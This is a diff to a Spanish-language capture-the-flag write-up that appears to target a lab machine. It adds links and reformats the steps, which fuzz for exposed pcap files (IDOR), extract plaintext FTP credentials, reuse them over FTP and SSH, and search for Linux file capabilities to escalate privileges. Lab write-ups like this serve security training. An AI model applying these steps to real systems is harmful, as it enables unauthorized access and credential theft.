@@ -69,6 +69,10 @@ La opción `Security Snapshot (5 Second PCAP + Analysis)` redirige a `http://10.
 
 Fuzzear para encontrar más archivos `.pcap` disponibles en el servidor
 
+<Callout type="info" title="">
+  [IDOR](/attacks/idor-es)
+</Callout>
+
 ```bash
 ffuf -w <(seq 0 100) -u http://10.129.4.66/data/FUZZ -c -fc 302
 ```
@@ -131,6 +135,10 @@ for id in IDS_RANGE:
 print("\n[+] Files downloaded")
 ```
 
+```bash
+python3 pcaps.py -i 10.129.4.66
+```
+
 Analizar los archivos descargados con `strings` para encontrar información relevante
 
 ```bash
@@ -148,11 +156,16 @@ PASS Buck3tH4TF0RM3!
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:151.0) Gecko/20100101 Firefox/151.0
 ```
 
-Credenciales encontradas `nathan:Buck3tH4TF0RM3!`
+Credenciales encontradas
+
+```plaintext
+USER: nathan
+PASS: Buck3tH4TF0RM3!
+```
 
 ## Exploitation
 
-Probar las credenciales encontradas para acceder al servicio FTP
+Probar las credenciales encontradas para acceder al servidor mediante el servicio FTP
 
 ```bash
 ftp 10.129.4.66
@@ -190,13 +203,17 @@ ftp> quit
 
 ## Privilege Escalation
 
-Probar las credenciales encontradas para acceder al servicio SSH
+Probar las credenciales encontradas para acceder al servidor mediante el servicio SSH
 
 ```bash
 ssh nathan@10.129.4.66
 ```
 
 Dentro del servidor buscar capabilities del kernel asignadas a archivos ejecutables en todo el sistema
+
+<Callout type="info" title="">
+  [Capabilities](/linux/capabilities-es)
+</Callout>
 
 ```bash
 getcap -r / 2>/dev/null
@@ -230,6 +247,9 @@ Obtener la flag de `root`
 
 ```bash
 cd /root
+```
+
+```bash
 ls
 ```
 
